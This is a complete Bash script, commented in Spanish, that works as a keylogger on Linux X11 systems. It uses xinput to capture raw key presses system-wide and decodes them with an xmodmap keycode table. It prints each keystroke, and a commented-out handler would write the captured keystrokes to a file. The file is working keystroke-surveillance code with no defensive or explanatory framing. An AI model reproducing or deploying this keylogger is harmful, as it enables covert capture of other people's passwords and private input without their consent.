#!/bin/bash

trap ctrl_c INT
# trap update_klg_file SIGQUIT

# Ctrl+c
ctrl_c (){
    echo -e "\n[+] Saliendo...\n"
    exit 1
}

# Ctrl+\ -> actualiza el archivo output_file.txt que contiene las pulsaciones de teclado
#update_klg_file(){
#    touch output_file.txt
#    while read key
#    do
#	echo -e ${keycodes[$key]} >> output_file.txt
#    done < key_press.tmp
#    echo " [+] Archivo actualizado con las ultimas pulsaciones"
#}

get_input_devices(){
    xinput list | awk -F "[" '/keyboard/ && !/master/ {sub(/^.{6}/,""); print $1}' > input_devices
}

# Variables
keycodes=($(echo "Nak Nak Nak Nak Nak Nak Nak Nak Nak $(xmodmap -pke | awk '{
    if ($4 == "BackSpace")
        print "delete";
    else if ($4 == "space")
        print "sp";
    else if ($4 == "Return")
        print "\\n";
    else print $4 }')"))

# Main function

xinput test-xi2 --root 3 | stdbuf -o0 sed -n '/(RawKeyPress)/,/det/ { /detail:/ s/.*detail: \([0-9]*\).*/\1/ p }' | while read key
do
    if [ ${keycodes[$key]} == "sp" ]; then
        echo -n " "
    else
    	echo -ne ${keycodes[$key]}
    fi
done

